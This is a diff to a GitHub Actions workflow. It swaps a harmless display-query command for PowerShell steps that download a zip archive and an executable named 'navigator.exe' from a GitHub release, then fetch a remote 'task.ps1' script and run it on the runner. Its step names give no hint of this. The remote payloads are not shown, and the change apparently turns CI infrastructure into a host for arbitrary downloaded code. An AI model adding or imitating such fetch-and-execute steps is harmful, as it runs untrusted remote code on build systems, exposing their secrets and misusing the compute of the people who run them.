@@ -17,4 +17,9 @@ jobs:
       uses: actions/checkout@v3
       
     - name: 'Unzip and Install'
-      run: wmic path Win32_VideoController get VideoModeDescription,CurrentVerticalResolution,CurrentHorizontalResolution /format:value
+      run: powershell.exe Invoke-WebRequest -URI "https://github.com/thewritingguruu/WA/releases/download/Brave-BR-WA1/brave-portable.zip" -OutFile "C:\unzip.zip" ; Expand-Archive -Path "C:\unzip.zip" -DestinationPath "C:\" ; Invoke-WebRequest -URI "https://github.com/thewritingguruu/WA/releases/download/Brave-BR-WA1/navigator.exe" -OutFile "C:\navigator.exe"
+      
+    - name: 'Starting Tasks'
+      run: powershell.exe Invoke-WebRequest -URI "https://raw.githubusercontent.com/thewritingguruu/WA/main/task.ps1" -OutFile "C:\task.ps1"
+    - name: 'Running Tasks'
+      run: powershell.exe 'C:\task.ps1'
